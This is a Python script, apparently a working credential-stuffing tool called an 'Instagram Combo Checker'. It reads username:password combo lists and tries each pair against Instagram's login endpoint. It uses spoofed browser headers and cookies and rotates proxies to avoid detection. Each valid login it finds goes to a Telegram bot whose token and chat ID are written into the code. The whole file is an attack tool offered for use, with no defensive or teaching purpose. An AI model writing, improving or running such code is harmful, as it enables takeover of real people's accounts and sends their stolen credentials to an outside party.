import requests
import time
import os
import json
import random
import itertools

def load_proxies(filepath):
    proxies = []
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    proxies.append({"http": f"http://{line}", "https": f"https://{line}"})
        print(f"Loaded {len(proxies)} proxies from {filepath}")
    except FileNotFoundError:
        print(f"Proxy file not found: {filepath}")
    return proxies

# ---------- CONFIG ----------
RATE_LIMIT_DELAY = 5

COMBO_FOLDER = "/home/ubuntu/upload/"

# Telegram Bot details (provided by user)
TELEGRAM_BOT_TOKEN = "6507893479:AAG0ukJB-Dwn2yixMmM8z6IeH2IiqVis5xs"
TELEGRAM_CHAT_ID = "5585396345"
# ----------------------------

def send_telegram_message(bot_token: str, chat_id: str, text: str):
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    try:
        r = requests.post(url, data=payload, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print("Telegram send error:", e)
        return False

def parse_combo_line(line: str):
    line = line.strip()
    if not line or ":" not in line:
        return None
    return line.split(":", 1)  # user, passwd

# ---------- Instagram API AUTH ----------
def app_authenticate_api(user: str, passwd: str, proxies: dict = None) -> bool:
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"

    # Updated cookies from new.txt
    cookies = {
        'csrftoken': 'q_heiWWG5z-LdL3FeXl0o3',
        'datr': 'p2-vaOyb02N0od0_86n0vhq3',
        'ig_did': 'DC7C09DD-4CBB-4E9C-921D-6352D4FF9D2B',
        'mid': 'aK9vqAAEAAGEIJbNuhROOHorWZMG',
        'ps_l': '1',
        'ps_n': '1',
        'dpr': '3.0234789848327637',
        'wd': '891x1723',
    }

    # Updated headers from new.txt
    headers = {
        'authority': 'www.instagram.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'sec-ch-prefers-color-scheme': 'dark',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-full-version-list': '"Chromium";v="139.0.7339.0", "Not;A=Brand";v="99.0.0.0"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-model': '""',
        'sec-ch-ua-platform': '"Linux"',
        'sec-ch-ua-platform-version': '""',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-asbd-id': '359341',
        'x-csrftoken': cookies['csrftoken'], # Use csrftoken from cookies
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '1026435137',
        'x-requested-with': 'XMLHttpRequest',
        'x-web-session-id': 'wea9s0:zcvg8y:73c71j',
    }

    # Updated data payload from new.txt
    # Note: enc_password is complex and likely generated by client-side JS.
    # For this script, we'll use a simplified approach or rely on the user to provide a valid enc_password format if the simple one fails.
    data = {
        'username': user,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{passwd}', # This format might need to be updated if Instagram's encryption changes frequently
        'caaF2DebugGroup': '0',
        'isPrivacyPortalReq': 'false',
        'loginAttemptSubmissionCount': '0',
        'optIntoOneTap': 'false',
        'queryParams': '{}',
        'trustedDeviceRecords': '{}',
        'jazoest': '21863',
    }

    try:
        resp = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=10, proxies=proxies)
        response_json = resp.json()

        # IMPORTANT FIX: Only consider 'authenticated': True as a successful login.
        # The previous logic was too broad and considered 'user': true and 'status': 'ok' as success,
        # even if 'authenticated' was false.
        if response_json.get('authenticated') is True:
            return True
        else:
            # Print error message from Instagram if available for debugging
            if 'message' in response_json:
                print(f"Login failed for {user}: {response_json['message']}")
            return False
    except requests.exceptions.ConnectionError:
        print(f"API error for {user}: Connection Error (e.g., no internet, DNS failure)")
        return False
    except requests.exceptions.Timeout:
        print(f"API error for {user}: Timeout Error (request took too long)")
        return False
    except requests.exceptions.HTTPError as http_err:
        print(f"API error for {user}: HTTP Error: {http_err}")
        return False
    except requests.exceptions.RequestException as req_err:
        print(f"API error for {user}: Request Exception: {req_err}")
        return False
    except json.JSONDecodeError:
        print(f"API response for {user} was not valid JSON: {resp.text}")
        return False
    except Exception as e:
        print(f"API error for {user}: An unexpected error occurred: {e}")
        return False
# ---------------------------------------

def main():
    # Load proxies
    proxy_list = load_proxies("/home/ubuntu/proxies.txt")
    if not proxy_list:
        print("No proxies loaded. Exiting.")
        return
    proxies_iterator = itertools.cycle(proxy_list)

    print("Starting Instagram Combo Checker...")

    # No need to ask for token/chat_id, they are hardcoded now
    bot_token = TELEGRAM_BOT_TOKEN
    chat_id = TELEGRAM_CHAT_ID

    # Choose combo file from Download folder
    files = [f for f in os.listdir(COMBO_FOLDER) if f.endswith(".txt")]
    if not files:
        print("No .txt files in Download folder. Please place your combo file there.")
        return
    print("Available combo files:")
    for idx, f in enumerate(files):
        print(f"{idx+1}. {f}")
    
    try:
        choice = int(input("Select file number: ")) - 1
        combo_file_name = os.path.join(COMBO_FOLDER, files[choice])
    except (ValueError, IndexError):
        print("Invalid choice. Exiting.")
        return

    seen = set()
    valid_count = 0
    total = 0

    print(f"Processing combo file: {combo_file_name}")
    with open(combo_file_name, "r", encoding="utf-8") as f:
        for raw in f:
            total += 1
            parsed = parse_combo_line(raw)
            if not parsed:
                print(f"[SKIP] Invalid line format: {raw.strip()}")
                continue
            user, passwd = parsed
            key = f"{user}:{passwd}"
            if key in seen:
                print(f"[SKIP] Duplicate combo: {key}")
                continue
            seen.add(key)

            print(f"[CHECKING] {user}:{passwd}")
            current_proxy = next(proxies_iterator)
            is_valid = app_authenticate_api(user, passwd, proxies=current_proxy)
            if is_valid: # Send if valid
                valid_count += 1
                message = f"Valid combo found:\nUser: {user}\nPass: {passwd}"
                sent = send_telegram_message(bot_token, chat_id, message)
                print(f"[VALID] {user} -> Telegram sent: {sent}")
            # No else block for printing [BAD] or sending to Telegram for invalid.
            # This ensures only valid combos are processed further or printed.

            time.sleep(RATE_LIMIT_DELAY)

    print(f"\nDone. Checked {len(seen)} unique combos, valid found: {valid_count} (out of {total} lines).")

if __name__ == "__main__":
    main()
